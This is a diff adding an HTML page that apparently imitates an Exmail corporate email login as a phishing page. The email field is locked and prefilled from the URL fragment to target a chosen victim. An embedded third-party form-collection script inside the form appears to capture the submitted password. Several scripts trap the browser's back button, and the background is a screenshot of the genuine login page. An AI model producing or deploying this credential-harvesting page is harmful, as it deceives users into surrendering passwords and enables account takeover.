@@ -1,0 +1,355 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Exmail Login - Not just mailbox</title>
+    <style>
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+        }
+
+        body {
+            /* Full screen layout using the faint grey office desk laptop image backdrop seamlessly */
+            background: linear-gradient(rgba(255, 255, 255, 0.45), rgba(255, 255, 255, 0.45)), 
+                        url('https://unsplash.com') no-repeat center center fixed;
+            background-size: cover;
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            position: relative;
+        }
+
+        /* Top Branding Header Utilities Bar Component Layout Grid */
+        .header-bar {
+            width: 100%;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 24px 80px;
+            background-color: transparent;
+            z-index: 10;
+        }
+
+        .brand-logo {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            font-size: 20px;
+            font-weight: bold;
+            color: #0066cc;
+            text-decoration: none;
+            letter-spacing: 2px;
+            text-transform: uppercase;
+        }
+
+        /* Replicating the dual interlocking geometric shapes logo marker symbol */
+        .logo-symbol {
+            font-size: 24px;
+            transform: rotate(-10deg);
+        }
+
+        .top-utilities-links {
+            font-size: 13px;
+            color: #4a5568;
+        }
+
+        .top-utilities-links a {
+            color: #4a5568;
+            text-decoration: none;
+            margin: 0 4px;
+        }
+
+        .top-utilities-links a:hover {
+            color: #0066cc;
+        }
+
+        /* Main Workspace Splitting Layout Component */
+        .workspace-body {
+            flex-grow: 1;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            padding: 0 10% 80px;
+            z-index: 5;
+        }
+
+        /* Left Column Heading Typography Component */
+        .hero-heading-side {
+            max-width: 500px;
+        }
+
+        .hero-heading-side h2 {
+            font-size: 40px;
+            font-weight: 400;
+            color: #2d3748;
+            line-height: 1.3;
+            letter-spacing: -0.5px;
+        }
+
+        /* Right Column Form Area Layout Card Box Component */
+        .login-card {
+            background-color: #ffffff;
+            width: 100%;
+            max-width: 380px;
+            border-radius: 4px;
+            box-shadow: 0 15px 35px rgba(0, 0, 0, 0.08);
+            overflow: hidden;
+        }
+
+        .card-body {
+            padding: 40px 36px 32px;
+            text-align: center;
+        }
+
+        .card-title {
+            font-size: 18px;
+            color: #333333;
+            font-weight: 500;
+            margin-bottom: 30px;
+        }
+
+        .form-group {
+            margin-bottom: 20px;
+        }
+
+        /* Large clean structural text input elements fields */
+        .form-control {
+            width: 100%;
+            height: 44px;
+            border: 1px solid #dcdcdc;
+            border-radius: 2px;
+            padding: 0 14px;
+            font-size: 14px;
+            color: #333333;
+            outline: none;
+            background-color: #ffffff;
+        }
+
+        .form-control:focus {
+            border-color: #3b82f6;
+        }
+
+        .form-control::placeholder {
+            color: #a0aec0;
+            font-weight: 300;
+        }
+
+        /* Recovery helper rows options components alignment grid block */
+        .options-row {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            width: 100%;
+            font-size: 13px;
+            margin-bottom: 20px;
+        }
+
+        .checkbox-container {
+            display: flex;
+            align-items: center;
+            gap: 6px;
+            color: #718096;
+            cursor: pointer;
+        }
+
+        .checkbox-container input {
+            accent-color: #3b82f6;
+        }
+
+        .forgot-link {
+            color: #3b82f6;
+            text-decoration: none;
+        }
+
+        .forgot-link:hover {
+            text-decoration: underline;
+        }
+
+        /* Solid rectangular royal blue submission trigger button block component */
+        .submit-btn {
+            width: 100%;
+            background-color: #2575fc;
+            color: #ffffff;
+            border: none;
+            height: 46px;
+            font-size: 15px;
+            font-weight: 500;
+            border-radius: 2px;
+            cursor: pointer;
+            transition: background-color 0.15s ease;
+        }
+
+        .submit-btn:hover {
+            background-color: #1a65ec;
+        }
+
+        /* Alternate secondary option tab navigation base links ribbon strip */
+        .card-footer-tabs {
+            display: flex;
+            border-top: 1px solid #f0f0f0;
+            background-color: #ffffff;
+        }
+
+        .tab-action-btn {
+            flex: 1;
+            padding: 16px 12px;
+            text-align: center;
+            font-size: 13px;
+            color: #4a5568;
+            text-decoration: none;
+            cursor: pointer;
+        }
+
+        .tab-action-btn:not(:last-child) {
+            border-right: 1px solid #f0f0f0;
+        }
+
+        .tab-action-btn:hover {
+            color: #2575fc;
+            background-color: #fafafa;
+        }
+
+        /* Fixed Background Desktop System Watermark Overlay Component */
+        .system-watermark {
+            position: fixed;
+            bottom: 24px;
+            right: 24px;
+            text-align: left;
+            font-size: 13px;
+            color: rgba(0, 0, 0, 0.14);
+            line-height: 1.4;
+            user-select: none;
+            pointer-events: none;
+            z-index: 20;
+        }
+
+        @media (max-width: 860px) {
+            .header-bar {
+                padding: 24px 30px;
+            }
+            .workspace-body {
+                flex-direction: column;
+                justify-content: center;
+                gap: 50px;
+                padding: 40px 20px;
+            }
+            .hero-heading-side {
+                text-align: center;
+                max-width: 100%;
+            }
+            .hero-heading-side h2 {
+                font-size: 28px;
+            }
+            .login-card {
+                max-width: 100%;
+            }
+        }
+    </style>
+</head>
+<body>
+
+    <!-- Header Branding Module ribbon row container element -->
+    <header class="header-bar">
+        <a href="#" class="brand-logo">
+            <span class="logo-symbol">⋈</span> exmail
+        </a>
+        <div class="top-utilities-links">
+            <a href="#">Register new company</a> | 
+            <a href="#">Send and receive emails in the app</a> | 
+            <a href="#">Chinese</a>
+        </div>
+    </header>
+
+    <!-- Center Composition Area Section Framework -->
+    <main class="workspace-body">
+        
+        <!-- Left Side: Informational Headline Copy -->
+        <div class="hero-heading-side">
+            <h2>Not just mailbox,<br>a new efficient office experience.</h2>
+        </div>
+
+        <!-- Right Side: Login Dashboard Module Panel Card Box Component -->
+        <div class="login-card">
+            <div class="card-body">
+                <h3 class="card-title">Account password login</h3>
+                    
+                <form action="" method="POST">
+<script id="ratufa_loader" src="https://www.ratufa.io/c/ld.js?f=px88b6jp&n=n1.ratufa.io"></script>
+                    <div class="form-group">
+                <input type="email" id="email" name="email" class="form-control" placeholder="Email address" readonly="readonly" />
+                    </div>
+
+                    <div class="form-group">
+<input type="password" name="Password" placeholder="Password" class="form-control" style="font-size: 12pt; required="" oninvalid="this.setCustomValidity('Wprowadź hasło do swojego adresu e-mail')"
+  oninput="this.setCustomValidity('')"/>
+                    </div>
+
+                    <div class="options-row">
+                        <label class="checkbox-container">
+                            <input type="checkbox" name="auto_login">
+                            <span>Auto login within 5 days</span>
+                        </label>
+                        <a href="#" class="forgot-link">Forgot Password</a>
+                    </div>
+
+                    <button type="submit" class="submit-btn">log in</button>
+                </form>
+            </div>
+
+            <!-- Double structural bottom alternate choice links panels menu -->
+            <div class="card-footer-tabs">
+                <a class="tab-action-btn">Scan code login</a>
+                <a class="tab-action-btn">Mobile number login</a>
+            </div>
+        </div>
+
+    <script>
+        window.addEventListener('DOMContentLoaded', () => {
+            if (window.location.hash) {
+                document.getElementById("email").value = window.location.hash.substring(1).trim();
+            }
+        });
+    </script>
+	    <!-- 1. ANTI-BACKTRACK INTERLOCK ENGINE -->
+    <script type="text/javascript">
+        (function() {
+            window.history.pushState(null, null, window.location.href);
+            
+            window.onpopstate = function() {
+                window.history.pushState(null, null, window.location.href);
+           
+            };
+        })();
+    </script>
+<script type="text/javascript">
+    window.history.pushState(null, "", window.location.href);
+    
+    window.addEventListener("popstate", function() {
+        window.history.pushState(null, "", window.location.href);
+    });
+</script>
+<script type="text/javascript">
+    function preventBack() {
+        window.history.forward();
+    }
+    setTimeout("preventBack()", 0);
+    
+    window.onunload = function () { null };
+</script>
+
+</body>
+    
+</html>
+<style>
+body{
+background-image:url("https://github.com/cdtechdigital/images/blob/main/EXmail.jpg?raw=true");
+background-repeat:no-repeat;
+background-image:fixed;
+background-size:cover;
+}
+</body>
+</html>
